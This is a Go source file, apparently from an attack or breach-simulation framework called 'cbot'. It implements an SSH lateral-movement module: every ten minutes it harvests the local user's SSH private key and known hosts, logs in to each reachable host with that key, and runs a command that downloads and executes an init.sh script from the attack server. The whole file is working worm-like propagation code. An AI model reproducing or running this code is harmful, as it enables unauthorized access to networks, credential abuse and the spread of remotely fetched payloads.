package unix

import (
	"fmt"
	"github.com/cbot/attack"
	"github.com/cbot/proto/ssh"
	"github.com/cbot/targets/local"
	"runtime"
	"time"
)

var SSHNOPassWordLoginAttackType = "SSHNoPasswdLoginAttack"
var SSHNoPassWordLoginAttackName = "ssh_nopasswd_login_attack"

type UnixSSHLoginAttack struct {

	attackTasks *attack.AttackTasks

	loginInfo *local.SSHLoginInfo

	attacked map[string]bool
}

func NewUnixSSHLoginAttack(attackTasks *attack.AttackTasks) *UnixSSHLoginAttack {

	return &UnixSSHLoginAttack{
		attackTasks: attackTasks,
		loginInfo:nil,
		attacked: make(map[string]bool,0),
	}
}

func (slog *UnixSSHLoginAttack) isChange(loginInfo *local.SSHLoginInfo) bool {

	if slog.loginInfo == nil {
		return true
	}

	if loginInfo.PrivateKey() != "" {
		return true
	}

	return false
}

func (slog *UnixSSHLoginAttack) isAttacked(host *local.SSHHost) bool {

	if _, ok := slog.attacked[host.IP()]; ok {

		return true
	}

	return false
}

func (slog *UnixSSHLoginAttack) doAttack(sshHost *local.SSHHost) {

	user := slog.loginInfo.User()
	privkey := slog.loginInfo.PrivateKey()

	host := sshHost.IP()
	if host == "" {

		host = sshHost.Host()
	}

	if host == "" ||host == slog.attackTasks.GetNodeIP() {
		return
	}

	port := sshHost.Port()

	if port <= 0 {
		port = 22
	}

	//log.Printf("Try to  use ssh login remote host:%s:%d,with private key:%s",host,port,privkey)

	sshClient, err := ssh.LoginWithPrivKey(host, port, user, privkey, 10000)

	if err != nil {

		return
	}

	defer sshClient.Close()

	//login ok ,then start to attack
	var ap *attack.AttackProcess

	initUrl := slog.attackTasks.DownloadInitUrl(host, port, SSHNOPassWordLoginAttackType, "init.sh")

	cmd := slog.attackTasks.InitCmdForLinux(initUrl,SSHNOPassWordLoginAttackType)

	result, err := sshClient.RunCmd(cmd)

	if err != nil {

		//attack failed
		ap = &attack.AttackProcess{
			TengoObj: attack.TengoObj{},
			IP:       host,
			Host:     host,
			Port:     port,
			Proto:    "ssh",
			App:      "ssh",
			OS:       "linux",
			Name:     SSHNoPassWordLoginAttackName,
			Type:     SSHNOPassWordLoginAttackType,
			Status:   -1,
			Payload:  cmd,
			Result:   fmt.Sprintf("%v", err),
			Details:  fmt.Sprintf("%s|%s", user, "nopass"),
		}

	} else {

		ap = &attack.AttackProcess{
			TengoObj: attack.TengoObj{},
			IP:       host,
			Host:     host,
			Port:     port,
			Proto:    "ssh",
			App:      "ssh",
			OS:       "linux",
			Name:     SSHNoPassWordLoginAttackName,
			Type:     SSHNOPassWordLoginAttackType,
			Status:   0,
			Payload:  cmd,
			Result:   string(result),
			Details:  fmt.Sprintf("%s|%s", user, "nopass"),
		}

	}

	slog.attackTasks.PubAttackProcess(ap)
	slog.attacked[host] = true

}

func (slog *UnixSSHLoginAttack) attack() {

	timer := time.Tick(10 * time.Minute)

	for {

		select {

		case <-timer:
			logInfo := local.CollectSSHLoginInfo()

			if slog.isChange(logInfo) {

				slog.loginInfo = logInfo

				if slog.loginInfo.PrivateKey() != "" && len(slog.loginInfo.Hosts()) > 0 {

					for _, sshHost := range slog.loginInfo.Hosts() {

						if slog.isAttacked(sshHost) {

							continue
						}

						slog.doAttack(sshHost)
					}
				}
			}
		}
	}

}

func (slog *UnixSSHLoginAttack) Start() error {

	if runtime.GOOS == "windows" {

		return fmt.Errorf("cannot run on windows")

	}

	go slog.attack()

	return nil
}
